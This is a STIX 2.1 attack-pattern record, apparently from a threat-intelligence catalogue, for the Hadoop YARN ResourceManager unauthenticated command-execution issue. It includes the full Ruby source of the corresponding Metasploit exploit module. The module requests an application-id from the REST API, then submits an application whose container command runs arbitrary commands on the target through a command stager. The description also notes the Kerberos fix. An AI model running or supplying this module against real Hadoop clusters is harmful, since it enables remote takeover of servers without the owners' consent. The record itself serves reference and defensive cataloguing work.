{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1a95798e-7886-4e8d-a913-c876fd686562",
    "created": "2024-08-14T17:02:11.680951Z",
    "modified": "2024-08-14T17:02:11.680955Z",
    "name": "Hadoop YARN ResourceManager Unauthenticated Command Execution",
    "description": " This module uses Hadoop's standard ResourceManager REST API to execute arbitrary commands on an unsecured Hadoop server. Hadoop administrators should enable Kerberos authentication for these endpoints by changing the 'hadoop.security.authentication' setting in 'core-site.xml' from 'simple' (the default) to 'kerberos' before exposing the node to the network.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/hadoop_unauth_exec.rb",
            "external_id": "hadoop_unauth_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn"
        },
        {
            "source_name": "reference",
            "url": "https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/SecureMode.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hadoop YARN ResourceManager Unauthenticated Command Execution',\n      'Description'    => %q{\n          This module uses Hadoop's standard ResourceManager REST API to execute arbitrary commands on an unsecured Hadoop server.\n          Hadoop administrators should enable Kerberos authentication for these endpoints by changing the 'hadoop.security.authentication' setting in 'core-site.xml' from 'simple' (the default) to 'kerberos' before exposing the node to the network.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'cbmixx',                            # Proof of concept\n          'Green-m <greenm.xxoo[at]gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['URL', 'http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf'],\n          ['URL', 'https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn'],\n          # Note, there will never be a CVE for this issue, since this is a misconfiguration by the administrator rather than a vulnerability in the software.\n          # Hadoop installations should always configure Kerberos authentication before being exposed to the network,\n          # since the default configuration does not require authentication.\n          ['URL', 'https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/SecureMode.html']\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        =>\n        [\n          ['Automatic', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-10-19',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([Opt::RPORT(8088)])\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path, '/ws/v1/cluster/apps/new-application'),\n        'method' => 'POST'\n      )\n    rescue Rex::ConnectionError\n      vprint_error(\"#{peer} - Connection failed\")\n      return CheckCode::Unknown\n    end\n\n    if res && res.code == 200 && res.body.include?('application-id')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status('Sending Command')\n    execute_cmdstager\n  end\n\n  def execute_command(cmd, opts = {})\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, '/ws/v1/cluster/apps/new-application'),\n      'method' => 'POST'\n    )\n\n    unless res && res.code == 200 && res.body.include?('application-id')\n     fail_with(Failure::NotFound, 'Could not retrieve application-id')\n    end\n\n    app_id = res.get_json_document['application-id']\n\n    post = {\n      'application-id'    => app_id,\n      'application-name'  => Rex::Text.rand_text_alpha_lower(4..12),\n      'application-type'  => 'YARN',\n      'am-container-spec' => {\n        'commands'        => {'command' => cmd.to_s}\n      }\n    }\n\n    send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, '/ws/v1/cluster/apps'),\n      'method' => 'POST',\n      'ctype'  => 'application/json',\n      'data'   => post.to_json\n    )\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-10-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}